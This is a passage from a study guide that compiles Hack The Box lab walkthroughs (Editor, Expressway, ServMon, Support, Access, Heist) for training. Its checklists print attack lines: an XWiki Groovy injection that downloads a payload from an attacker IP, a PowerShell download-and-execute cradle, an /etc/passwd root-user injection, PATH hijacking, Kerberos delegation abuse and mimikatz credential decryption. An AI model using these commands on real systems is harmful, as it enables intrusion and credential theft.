- 10m, 3d2H, 5h30s, 10m5h Absolute: "Jan 01 23:59", "01/01/1970 11:59PM", "1970-01-01 23:59:59" Unix Epoch: 1589808367 ------------------------------------------------------------- Now we can write to the log file as the root user, but now we need to validate if we can add newlines into our payload.
- 10m, 3d2H, 5h30s, 10m5h Absolute: "Jan 01 23:59", "01/01/1970 11:59PM", "1970-01-01 23:59:59" Unix Epoch: 1589808367 ------------------------------------------------------------- As you can see, we have successfully added our new user with root privileges into /etc/passwd .
- Therefore we can switch to that user using the password we used upon creation to get root access to the target. jacob@outbound:/var/log/below$ su tcg Password: root@outbound:/var/log/below# ls -la /root/root.txt -rw-r--r-- 1 root root 33 Jun 8 12:28 /root/root.txt Now we can read the root flag in /root/root.txt .

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin`, `/usr/bin/below`, `/opt/below`, `/var/log/below`, `/opt/below$`, `/var/log/`, `/var/log/below/`, `/var/log/below$`, `/var/log/below/store/index_01749254400`, `/var/log/below/store`, `/etc/passwd`, `/home/tyler`, `/home/jacob`, `/root/root.txt`

Open the PDF around page **7** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 18- Editor

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Editor.md) · [Official PDF](./htb-writeups/Editor.pdf)

### Machine path overview

Editor is an easy-difficulty Linux machine that focuses on web application exploitation followed by local privilege escalation. Initial enumeration reveals a web application exposing an XWiki instance, which is identified as vulnerable to CVE-2025-24893 , a remote code execution flaw in the SolrSearch endpoint. By adapting a public proof-of-concept, Groovy code injection is achieved, allowing arbitrary command execution and providing a shell as the xwiki user. Post-exploitation enumeration of the system reveals additional local users and misconfigurations that allow lateral movement to the user oliver. Further analysis of the system uncovers a privilege escalation vector involving a misconfigured SUID binary that relies on environment-controlled execution. By abusing PATH manipulation, a malicious binary is executed in place of a trusted system binary, resulting in execution with elevated privileges and ultimately granting root access.

### Remote enumeration and foothold checks

- Enumerate the XWiki application/version and identify CVE-2025-24893 in the SolrSearch endpoint.
- Adapt the Groovy injection so it first downloads a payload to /tmp, marks it executable, and runs it; URL encoding/context matters.
- Catch the initial shell as xwiki.
- Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Post-foothold local enumeration and lateral movement

- Use product installation knowledge to search specifically for hibernate.cfg.xml instead of grepping the whole filesystem blindly.
- Read /etc/xwiki/hibernate.cfg.xml for the local MySQL username/password.
- List /home and test the recovered application password against the real user oliver over SSH.
- Check oliver's groups: membership in netdata grants execution of root-owned SUID Netdata plugins.
- Enumerate Netdata SUID files and inspect /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help for trusted executable names such as nvme.
- XWiki RCE leads to `/etc/xwiki/hibernate.cfg.xml`; reuse that credential as Oliver, then abuse Oliver's netdata-group access to SUID `ndsudo` and its PATH lookup of attacker-controlled `nvme`. LXD/LXC is not used.

### User path

**Memory chain:** XWiki CVE-2025-24893 → Groovy command execution → hibernate.cfg.xml credential → SSH as oliver

- Foothold CVE-2025-24893 - Local access as user xwiki Researching for vulnerabilities related to XWiki version 15.10.8 , we come across CVE2025-2483, which details a remote code execution vulnerability through the SolrSearch endpoint.
- BASE: curl 10.10.15.42/shell -o /tmp/shell ENCODED: curl%2010.10.15.42%2Fshell%20-o%20%2Ftmp%2Fshell INSIDE THE SCRIPT: def exploit(target_url): target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip()) exploit_url = f"{target_url}/bin/get/Main/SolrSearch? media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dpri ntln(%22curl%2010.10.15.42%2Fshell%20o%20%2Ftmp%2Fshell%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d " Running the script again, the executable is uploaded on the target system.
- 10.129.231.23 - - [03/Apr/2026 11:21:23] "GET /shell HTTP/1.1" 200 - Now we will follow the same process again, to run the executable on the target using the commands chmod +x /tmp/shell to grant execution permissions and bash /tmp/shell to finally run it.
- Since the reverse shell payload was executed from inside the application's context, we know that the user xwiki is running the application, and it is most likely that this user has access to the application's files.
- Searching the home directory for users: ls -la /home total 12 drwxr-xr-x 3 root root 4096 Jul 8 2025 . drwxr-xr-x 18 root root 4096 Jul 29 2025 .. drwxr-x--- 3 oliver oliver 4096 Jul 8 2025 oliver The user oliver has a working directory.

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV editor.htb`
- `Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds`
- `curl 10.10.15.42/shell -o /tmp/shell`
- `find / -name "*hibernate.cfg.xml*" 2>/dev/null`
- `ssh oliver@editor.htb`

### Artifacts and exact search anchors

`editor.htb`, `wiki.editor.htb`, `CVE-2025-24893`, `/etc/passwd`, `CVE-2025-24893.py`, `/usr/sbin`, `/usr/sbi`, `/usr/sbin/nologin`, `/var/cache/man`, `/var/spool/lpd`, `/var/mai`, `/var/spool/news`, `/var/spool/uucp`, `/var/www`, `/var/backups`, `/usr/sb`, `/var/list`, `/usr/sbin/n`, `/var/lib/gnats`, `/usr/sbin/nologi`, `/home/syslog`, `/usr/sbin/nolog`, `/var/lib/tpm`, `/var/lib/landsca`, `/var/lib/usbmux`, `/var/snap/l`, `/var/lib/misc`, `/var/lib/tomcat`, `/var/lib/xw`, `/opt/netdata`, `/usr/sbin/nol`, `/home/oliver`, `/var/log/laurel`, `/tmp/shell`, `hibernate.cfg.xml`, `/etc/xwiki/hibernate.cfg.xml`

Open the PDF around page **4** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Compile/upload a malicious executable named nvme into a writable directory such as /tmp and prepend that directory to PATH.
- Invoke the SUID ndsudo nvme-list action so it resolves the attacker-controlled nvme and runs it with effective root privileges.
- The vulnerable boundary is ndsudo's environment-controlled executable search, not generic SUID exploitation.
- Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.

### Root / Administrator path

**Memory chain:** netdata group → SUID ndsudo → attacker-controlled nvme via PATH → root shell

- Netdata local privilege escalation The oliver user is a member of a group called netdata which is not standard.
- It is typical to run local enumeration tools such as linpeas when we gain access to the local system.
- The owner of these files is the root user, and since the suid permission on a file makes it run with the file owner’s privileges, not the user who executes it, the plugins all run under an elevated session.

#### Commands and PDF search strings

- `wget http://10.10.15.42/nvme`

### Artifacts and exact search anchors

`/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network`, `/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin`, `/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners`, `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`, `/opt/netdata/usr/libexec/netdata/plugins.d/ioping`, `/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin`, `/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin`, `/root/root.txt`

Open the PDF around page **9** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 19- Expressway

**Target:** Linux · Easy

[Detailed notes](./htb-writeups/Expressway.md) · [Official PDF](./htb-writeups/Expressway.pdf)

### Machine path overview

Expressway is an easy-difficulty Linux machine that demonstrates enumeration and exploits the IKE service, a component of the IPsec framework. Upon leaking the Pre-Shared key of the service and cracking it, the retrieved clear-text credentials are used to access the target via SSH. For privilege escalation, CVE-2025-32462 is exploited to get a privileged shell as the root user.

### Remote enumeration and foothold checks

- Do not stop after the TCP scan shows only SSH; run UDP scanning and identify IKE/IPsec.
- Use ike-scan aggressive mode to fingerprint the transform, group name/identity, and capture material suitable for offline PSK cracking.
- Use --pskcrack output with Hashcat to recover the pre-shared key/password and combine it with the leaked IKE username.
- Test the recovered credential over SSH.
- Enumerate UDP/69 as well as IKE: tftp-enum.nse reveals ciscortr.cfg, and unauthenticated TFTP get ciscortr.cfg exposes the ike username and target hostname needed to interpret the IKE material.
- UDP/161 is closed in the writeup. The overlooked services are TFTP/69, which leaks `ciscortr.cfg`, and IKE/500, whose captured PSK material is cracked for SSH access.

### Post-foothold local enumeration and lateral movement

- Run sudo -l and capture the installed sudo version; the vulnerable behavior is version-specific.
- For CVE-2025-32462, enumerate host-specific sudo rules with the -h behavior and identify a configured host where ike may run commands.
- Also understand the alternate CVE-2025-32463 chroot/NSS path described in the writeup: it requires staging nsswitch.conf and a malicious NSS library.
- For CVE-2025-32462, inspect ike's proxy group-readable files; /var/log/squid/access.log.1 reveals offramp.expressway.htb, which is the host argument for sudo -h offramp.expressway.htb -l and then sudo -h offramp.expressway.htb bash.

### User path

**Memory chain:** UDP TFTP ciscortr.cfg → IKE aggressive-mode capture → PSK cracking → SSH as ike

- can see it mentioning the IKE service, which is a component of the IPsec framework.
- This is primarily used to create encrypted tunnels to allow secure communication over a network.
- From this article, we can learn more about this service and how it works.
- This means that the VPN is configured with a Pre-Shared key.
- Also, from the output, we see the encryption is set to 3DES , and the hash is SHA1 .

#### Commands and PDF search strings

- `sudo nmap -sU --top-port=20 10.10.11.87`
- `nmap and further enumerate it with the tftp-enum.nse script.`
- `sudo nmap -sU 10.10.11.87 -p 69 --script=tftp-enum.nse`
- `hashcat k.hash /usr/share/wordlists/rockyou.txt`
- `ssh ike@10.10.11.87`

### Artifacts and exact search anchors

`expressway.htb`, `/usr/share/wordlists/rockyou.txt`

Open the PDF around page **3** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Use the applicable sudo CVE-2025-32462 host option path to obtain an unrestricted root command/shell.
- If following the chroot alternative, compile the shared library with its constructor payload, construct the expected libnss path, and invoke vulnerable sudo -R against the staged root.
- Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.

### Root / Administrator path

**Memory chain:** proxy-readable Squid access.log.1 → offramp.expressway.htb sudo host rule → sudo -h host-option abuse → root shell

- For us to exploit this, we need to find a host configured so that the ike user is allowed to list the sudo permissions.
- So let's run /bin/bash to get an interactive shell as the root user. ike@expressway:~$ sudo -h offramp.expressway.htb bash root@expressway:/home/ike# whoami root Now we have a privileged shell as the root user.
- The root flag can be found in /root/root.txt .
- This version of sudo is also vulnerable to CVE-2025-32463 which allows local privilege escalation because nsswitch.conf file created by an arbitrary user is allowed to be used in a privileged process with the --chroot option in sudo .
- Now that we understand what happens, let's run the script. ike@expressway:/tmp$ chmod +x exploit.sh ike@expressway:/tmp$ ./exploit.sh woot! root@expressway:/# whoami root Just as we expected, we drop in to a privileged shell as the root user.

#### Commands and PDF search strings

- `sudo -R woot woot`

### Artifacts and exact search anchors

`CVE-2025-32462`, `/etc/sudoers`, `/var/spool/squid`, `/var/spool/squid/netdb.state`, `/var/log/squid`, `/var/log/squid/cache.log.2.gz`, `cache.log.2.gz`, `/var/log/squid/access.log.2.gz`, `access.log.2.gz`, `/var/log/squid/cache.log.1`, `/var/log/squid/access.log.1`, `/var/log/squid/`, `offramp.expressway.htb`, `/usr/local/sbin`, `/usr/local/bin`, `/usr/sbin`, `/usr/bin`, `/home/ike`, `/root/root.txt`, `CVE-2025-32463`, `nsswitch.conf`, `exploit.sh`, `/tmp/sudowoot.stage.XXXXXX`, `/etc/group`

Open the PDF around page **5** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 20- ServMon

**Target:** Windows · Easy

[Detailed notes](./htb-writeups/ServMon.md) · [Official PDF](./htb-writeups/ServMon.pdf)

### Machine path overview

ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1000 (Network Surveillance Management Software) instance. This is found to be vulnerable to LFI, which is used to read a list of passwords on a user's desktop. Using the credentials, we can SSH to the server as a second user. As this low-privileged user, it's possible enumerate the system and ﬁnd the password for NSClient++ (a system monitoring agent). After creating an SSH tunnel, we can access the NSClient++ web app. The app contains functionality to create scripts that can be executed in the context of NT AUTHORITY\SYSTEM . Users have been given permissions to restart the NSCP service, and after creating a malicious script, the service is restarted and command execution is achieved as SYSTEM.

### Remote enumeration and foothold checks

- Use anonymous FTP to read user text files; Confidential.txt points to C:\Users\Nathan\Desktop\Passwords.txt.
- Fingerprint NVMS-1000 and exploit its directory traversal/LFI to retrieve Nathan's desktop password list.
- Password-spray the recovered list against SSH for the enumerated Windows users; nadine has the working password.
- Keep the case/path/encoding required by the NVMS traversal payload.
- Try anonymous FTP and inspect every downloadable file, including hidden/configuration/backup material and binary-transfer artifacts.
- Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.
- Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
- Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.

### Post-foothold local enumeration and lateral movement

- As nadine, query NSClient++ directly with nscp.exe web -- password --display to recover the web password.
- Inspect NSClient++ configuration and note that web access is restricted to localhost.
- Check the NSCP service properties/ACL and confirm nadine can stop/restart it even though Service Control Manager enumeration may be partially denied.
- Create an SSH local tunnel from local 8443 to target 127.0.0.1:8443 and log into the NSClient++ web UI.
- Add a malicious external script/command through NSClient++, save/reload configuration, and prepare the callback.

### User path

**Memory chain:** FTP → SSH → default credentials → known-vulnerability research → LFI/local file read → path traversal → password spraying → group-membership abuse

- A Users directory contains subdirectories for Nadine and Nathan , which themselves contain a text ﬁle. ftp 10.10.10.184 anonymous passive ls cd Users ls Nadine get "Nadine\\Confidential.txt" ls Nathan get "Nathan\\Notes to do.txt" Confidential.txt reveals the existence of a Passwords.txt on Nathan's desktop.
- Foothold NVMS Searching on Exploit-DB for the NVMS software returns Local File Inclusion exploit assigned CVE2019-20085.
- Add them to a users.txt along with administrator . use auxiliary/scanner/ssh/ssh_login set RHOSTS 10.10.10.184 set USER_FILE users.txt set PASS_FILE passwords.txt run The password L1k3B1gBut7s@W0rk was found to work for the username nadine , and a command shell is opened as this user.
- However, the command whoami /priv reveals that they are an unprivileged user.
- The user ﬂag can be found in C:\Users\Nadine\Desktop\ .

#### Commands and PDF search strings

- `nmap -p$ports -sC -sV 10.10.10.184`

### Artifacts and exact search anchors

`win.ini`, `C:\Users\Nathan\Desktop\Passwords.txt`, `C:\Users\Nadine\Desktop\`

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Restart the NSCP service so the privileged service loads the newly created script, then execute it from the web console as SYSTEM.
- If the command does not appear, ensure configuration changes were saved and the service was fully restarted through the permission nadine actually has.
- Use SSH/local/dynamic port forwarding for internal-only services and hidden vhosts. Preserve the required Host header/DNS name through the tunnel rather than browsing only `localhost`.
- After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.

### Root / Administrator path

**Memory chain:** service abuse → ACL abuse → SSH → web shell/RCE

- This blog post by Rohn Edwards shows how we can obtain the service permissions in PowerShell.
- Get-Service nscp | fl * The CanStop parameter is set to true which means we can stop the service.
- Normally a low privileged user cannot start the service but in this case the user has been granted permission to start it.
- Exploitation Let's set up an SSH tunnel to access the web app from localhost port 8443 ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 Navigate to https://localhost:8443 and use the password found in the ini ﬁle to login.
- Next, input /settings/external scripts/scripts/shell in the Section ﬁeld, the command in the Key ﬁeld, and C:\Temp\pwn.bat in Value .

#### Commands and PDF search strings

- `ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184`
- `sudo ./GreatSCT.py --ip 10.10.14.13 --port 1234 -t bypass -p`
- `sudo python3 -m http.server 80`
- `wget http://10.10.14.13/serv.dll -o C:\Temp\serv.dll`

### Artifacts and exact search anchors

`C:\Program`, `C:\Program Files\NSClient`, `Get-ServiceACL.ps1`, `GetServiceACL.ps1`, `C:\Temp\pwn.bat in Value . The bat`, `pwn.bat`, `GreatSCT.py`, `rev_tcp.py`, `/usr/share/greatsct-output/compiled/`, `serv.dll`, `C:\Temp\serv.dll`, `C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe`, `C:\Temp\pwn.bat`, `/usr/share/greatsct-output/handlers/serv.rc`, `C:\Users\Administrator\Desktop`

Open the PDF around page **8** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 21- Support

**Target:** Windows · Easy

[Detailed notes](./htb-writeups/Support.md) · [Official PDF](./htb-writeups/Support.pdf)

### Machine path overview

Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine's LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called support is identified in the users list, and the info field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through SharpHound , and BloodHound reveals that the Shared Support Accounts group that the support user is a member of, has GenericAll privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as NT Authority\System is received.

### Remote enumeration and foothold checks

- Test SMB anonymous access and inspect the nondefault support-tools share; download the UserInfo executable/archive.
- Reverse engineer or observe the executable's LDAP bind and reproduce its Base64-plus-XOR password decryption.
- Bind to LDAP as support\ldap with the recovered password and query users with all attributes, not just account names.
- Read the support user's info attribute for the cleartext password and verify membership in Remote Management Users before using WinRM.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.

### Post-foothold local enumeration and lateral movement

- Collect domain data with SharpHound from the support session and inspect nondefault group membership.
- BloodHound shows Shared Support Accounts has GenericAll over the Domain Controller computer object; translate that exact edge into RBCD.
- Verify msDS-AllowedToActOnBehalfOfOtherIdentity is empty/current before modification and confirm the domain machine-account quota permits creating a computer.
- Create FAKE-COMP01 with a known password and write its SID into the DC's RBCD attribute using PowerView/AD cmdlets.

### User path

**Memory chain:** LDAP enumeration → SMB enumeration → WinRM → BloodHound path analysis → source-code review → group-membership abuse

- Then run the binary again with wine as shown previously. wine UserInfo.exe -v find -first "administrator" The LDAP authentication is captured in WireShark and clicking on the bindRequest packet shows the username and password combination in use.
- In this case we instructed the server to go to the htb domain component, find the support domain component and then search for any objects inside it with the name Administrator .
- In the next window make sure to select Simple Authentication as the authentication method, ldap@support.htb as the Bind DN and paste in the password nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz in the Bind password field.
- Further down we can also see that this user is a member of the Remote Management Users group, which allows them to connect over WinRM.
- To this end lets attempt to use evil-winrm to connect remotely to the support user with the identified password. evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb The connection is successful and the user flag can be found in C:\Users\Support\Desktop .

#### Commands and PDF search strings

- `nmap -sC -sV -Pn 10.129.178.26`
- `smbclient -L \\\\10.129.178.26\\`
- `smbclient \\\\10.129.178.26\\support-tools`
- `wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2rc/Linux.x64.Release.zip`
- `sudo ./ILSpy`
- `sudo apt install ldap-utils`
- `ldapsearch -h support.htb -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'`
- `evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb`

### Artifacts and exact search anchors

`UserInfo.exe.zip`, `Linux.x64.Release.zip`, `ILSpy-linux-x64-Release.zip`, `support.htb`, `/etc/hosts`, `decrypt.py`, `C:\Users\Support\Desktop`

Open the PDF around page **10** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Derive the fake machine account hash, request an S4U service ticket impersonating Administrator to the correct DC SPN, and inject/use the ticket.
- Use the delegated ticket for remote execution on the Domain Controller to obtain SYSTEM.
- Match the service SPN to the protocol used (for example CIFS/HOST); a valid ticket for the wrong SPN will not authorize the desired action.
- Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
- Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
- Translate the exact AD ACL edge into an action: take ownership, write a DACL, add group membership, reset a password, set an SPN, or add a key credential. Re-collect BloodHound after changing state.
- For RBCD, obtain/control a machine account, write `msDS-AllowedToActOnBehalfOfOtherIdentity`, request an impersonation service ticket, and use the ticket against the correct SPN.

### Root / Administrator path

**Memory chain:** BloodHound path analysis → WinRM → group-membership abuse → ACL abuse → delegation/RBCD → Kerberos ticket abuse → WMI/PowerShell remoting

- Performing a S4U Attack It is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the Administrator.
- First, we will need the hash of the password that was used to create the computer object. .\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb We need to grab the value called rc4_hmac .
- Next, create a new file called ticket.kirbi with the Base64 decoded value of the previous ticket. base64 -d ticket.kirbi.b64 > ticket.kirbi Finally, we can convert this ticket to a format that Impacket can use.
- This can be achieved with Impackets' TicketConverter.py . ticketConverter.py ticket.kirbi ticket.ccache To acquire a shell we can use Impackets' psexec.py .
- KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass A shell as NT Authority\System is successfully received and the root flag can be found in C:\Users\Administrator\Desktop .

#### Commands and PDF search strings

- `Get-ADDomain`
- `whoami /groups`
- `sudo apt install -y neo4j`
- `Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DSMachineAccountQuota`
- `Get-ADComputer -identity FAKE-COMP01`
- `Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount`

### Artifacts and exact search anchors

`dc.support.htb`, `support.htb`, `/etc/hosts`, `BloodHound-linux-x64.zip`, `C:\Windows\Temp`, `20221217070128_BloodHound.zip`, `msds-allowedtoactonbehalfofotheridentity`, `PowerView.ps1`, `Powermad.ps1`, `TicketConverter.py`, `psexec.py`, `C:\Users\Administrator\Desktop`

Open the PDF around page **17** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 22- Access

**Target:** Windows · Easy

[Detailed notes](./htb-writeups/Access.md) · [Official PDF](./htb-writeups/Access.pdf)

### Machine path overview

Access is an ​"​easy​"​ difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.

### Remote enumeration and foothold checks

- Log into FTP anonymously and switch to binary mode before downloading Backups/backup.mdb and the protected archive; text mode can corrupt binary files.
- Use mdb-tables/mdb-export against the Microsoft Access backup and inspect auth_user for the plaintext access-control-system credential.
- Use that credential to open the password-protected ZIP from the FTP share and read the email inside.
- The email discloses the security user's password; use it for Telnet to obtain the initial interactive session.
- Try anonymous FTP and inspect every downloadable file, including hidden/configuration/backup material and binary-transfer artifacts.
- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.

### Post-foothold local enumeration and lateral movement

- Enumerate Windows Credential Manager with cmdkey /list and inspect public/user shortcuts for a runas /savecred configuration.
- Recognize that /savecred can execute an arbitrary command as the stored administrator identity even though the password is not displayed.
- If direct runas behavior is constrained by the Telnet session token, locate DPAPI credential blobs under AppData\Local/Roaming\Microsoft\Credentials and matching Protect masterkeys.
- Export the credential blob and masterkey in binary-safe form for offline Mimikatz/DPAPI processing.

### User path

**Memory chain:** FTP enumeration → Microsoft Access DB secrets → protected-archive cracking → Telnet

- 7z l -slt Access\ Control.zip Using the previously gained password ​access4u@security​, the Zip file is extracted.
- 7z x Access\ Control.zip Foothold This reveals the file "Access Control.pst", which is a Microsoft Outlook Personal Folder file, used to store emails and other items.
- Post-Exploitation Upgrade from telnet shell The telnet shell is not very convenient, and it is quickly upgraded.
- The ​/B​ parameter is specified so that a new window is not created for the shell, which has the effect that the incoming shell is able to use the full width of the screen, instead of being constrained to the telnet session display width.
- START /B ​""​ powershell -c IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.2/shell.ps1'​) Identification of saved credential A useful command to run when beginning enumeration is "cmdkey /list", which displays stored user names and passwords or credentials.

#### Commands and PDF search strings

- `nmap -Pn -sV -sC -p​$ports​ 10.10.10.98`
- `icacls C:\Users\Public\Desktop`
- `whoami /groups`

### Artifacts and exact search anchors

`backup.mdb`, `Control.zip`, `shell.ps1`, `Invoke-PowerShellTcpOneLine.ps1`, `C:\Users\Public`, `C:\Users\Public\Desktop`

Open the PDF around page **7** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Derive/decrypt the DPAPI masterkey using the security user's SID and password, then decrypt the saved Administrator credential blob.
- Use the recovered Administrator password for a new Telnet/remote session and retrieve the root flag.
- Keep track of user versus machine DPAPI scope and the exact GUID linking the credential blob to its masterkey.

### Root / Administrator path

**Memory chain:** saved-credential abuse → runas /savecred → Administrator shell

- In order to achieve this, it is necessary to identify the credential files and masterkeys.
- Credential filenames are a string of 32 characters, e.g. "85E671988F9A2D1981A4B6791F9A4EE8" while masterkeys are a GUID, e.g. "cc6eb538-28f1-4ab4-adf2-f5594e88f0b2".
- This matches the masterkey that was extracted. dpapi::​cred​ /​in​:51​AB168BE4BDB3A603DADE4F8CA81290 /​sid:S​-1-5-21-953262931-566350628-63446256-1001 /​password​:4​Cc3ssC0ntr0ller The masterkey file is examined next, and the key is extracted. dpapi::​masterkey​ /​in​:0792​c32e​-48​a5​-4​fe3​-8​b43​-​d93d64590580 /​sid:S​-1-5-21-953262931-566350628-63446256-1001 /​password​:4​Cc3ssC0ntr0ller With the masterkey in mimikatz’s cache, the credential blob can now be decrypted.
- It is now possible to open a telnet session as ACCESS\Administrator and gain the root flag. dpapi::​cred​ /​in​:51​AB168BE4BDB3A603DADE4F8CA81290

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`admin.ps1`, `C:\Users\security\AppData\Local\Microsoft\Vault`, `C:\Users\security\AppData\Local\Microsoft\Credentials`, `C:\Users\security\AppData\Local\Microsoft\Protect`, `C:\Users\security\AppData\Roaming\Microsoft\Vault`, `C:\Users\security\AppData\Roaming\Microsoft\Credentials`, `C:\Users\security\AppData\Roaming\Microsoft\Protect`, `C:\Users\security\AppData\Roamin`

Open the PDF around page **11** and search for `Privilege Escalation` plus the specific tools and artifacts above.


## 23- Heist

**Target:** Windows · Easy

[Detailed notes](./htb-writeups/Heist.md) · [Official PDF](./htb-writeups/Heist.pdf)

### Machine path overview

Heist is an easy difficulty Windows box with an “Issues” portal accessible on the web server, from which it is possible to gain Cisco password hashes. These hashes are cracked, and subsequently RID bruteforce and password spraying are used to gain a foothold on the box. The user is found to be running Firefox. The firefox.exe process can be dumped and searched for the administrator’s password.

### Remote enumeration and foothold checks

- Use the Issues portal guest access and download/read the attached Cisco configuration instead of attacking only the login form.
- Extract the Cisco type 7 passwords and decrypt them directly; extract the type 5 enable secret and crack it offline. Keep every recovered candidate.
- Test the apparent hazard credential on SMB/WinRM even when interactive logon fails; valid low-privilege credentials still permit RPC enumeration.
- Use CrackMapExec/NetExec --rid-brute (or lookupsid) with the valid credential to enumerate local/domain usernames from SIDs.
- Password-spray the recovered Cisco passwords across the RID-derived usernames and WinRM; Chase is the account with remote-management access.
- Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.
- Perform RID/SID cycling with `impacket-lookupsid`; save only `SidTypeUser` names for spraying. Try null, guest, and any low-privilege credential because each may expose different ranges.

### Post-foothold local enumeration and lateral movement

- From the Chase WinRM session, enumerate running processes and process owners; Firefox is running in the privileged user's context.
- Upload a compatible ProcDump/Sysinternals binary and dump the live firefox.exe process memory with -ma.
- Search the dump with strings for credentials, URLs, login parameters, and the Administrator username rather than relying only on filesystem secrets.

### User path

**Memory chain:** network-device config secrets → Cisco hash cracking → RPC user enumeration → WinRM

- Additionally, port 5985 (associated with WinRM) is exposed, which may allow remote sessions.
- The page allows us to login as a guest, which brings us to an “Issues” page.
- On searching about Cisco configurations, we ​find​ that the hashes are Cisco type 5 and type 7 password hashes.
- RID stands for Relative Identifier, which is a part of SID (Security Identifier) used to uniquely identify a user or service on a Windows host.
- Authentication was successful with the username Chase and password ​Q4)sJu\Y8qz*A3?d​.

#### Commands and PDF search strings

- `CME found valid credentials: ​hazard / stealth1agent.`
- `CME was able to identify three additional usernames - support, Chase and Jason. Let’s use the`

### Artifacts and exact search anchors

No stable artifact was extracted automatically; use the decision checks and commands.

Open the PDF around page **6** and search for the technologies, functions, filenames, and tools above.

### Privilege-escalation checks

- Recover the Administrator password from Firefox process memory and test it over WinRM.
- If multiple Firefox PIDs exist, dump/search each process or the parent/content process set; the credential may not be in the first PID.
- The escalation is credential recovery from a privileged GUI process, not a service/kernel exploit.

### Root / Administrator path

**Memory chain:** process enumeration → process-memory credential recovery → Administrator credential reuse

- As we have control over the process, we can dump the process and find passwords in it.
- The ​procdump​ utility can be used to dump process memory.
- can start an SMB server locally to transfer this file. smbserver.py -smb2support -username guest -password guest share /root/htb The server will use the credentials ​guest / guest ​for authentication.
- can see the entire URL string with the username and password parameters.
- The password “4dD!5}x/re8]FBuZ” can be used to login as Administrator.

#### Commands and PDF search strings

- No single canonical command; follow the decision reminders and PDF section.

### Artifacts and exact search anchors

`smbserver.py`, `/root/htb`

